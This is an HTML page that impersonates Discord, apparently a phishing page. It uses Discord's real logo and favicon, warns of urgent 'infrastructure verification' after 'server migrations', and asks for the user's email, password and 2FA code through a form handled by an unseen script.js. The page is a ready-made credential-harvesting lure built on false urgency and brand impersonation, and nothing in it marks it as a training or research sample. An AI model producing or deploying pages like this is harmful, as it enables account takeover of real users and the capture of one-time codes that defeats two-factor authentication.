<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Infrastructure Update Required</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://discord.com/assets/favicons/favicon-32x32.png">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg" alt="Discord" class="logo">
            <h1>Discord Infrastructure Update Required</h1>
        </div>
        
        <div class="alert">
            <div class="alert-icon">⚠️</div>
            <p>Your account requires immediate infrastructure verification due to recent server migrations. Please re-authenticate to continue using Discord.</p>
        </div>

        <form id="loginForm" class="login-form">
            <div class="input-group">
                <label>Email</label>
                <input type="email" id="email" required placeholder="your.email@example.com">
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" required placeholder="Enter your password">
            </div>

            <div class="input-group">
                <label>2FA Code (if enabled)</label>
                <input type="text" id="totp" placeholder="123456">
            </div>

            <button type="submit" class="login-btn">
                <span>Verify Account</span>
                <div class="loader" id="loader"></div>
            </button>
        </form>

        <div class="footer">
            <p>Discord Infrastructure Team © 2026</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
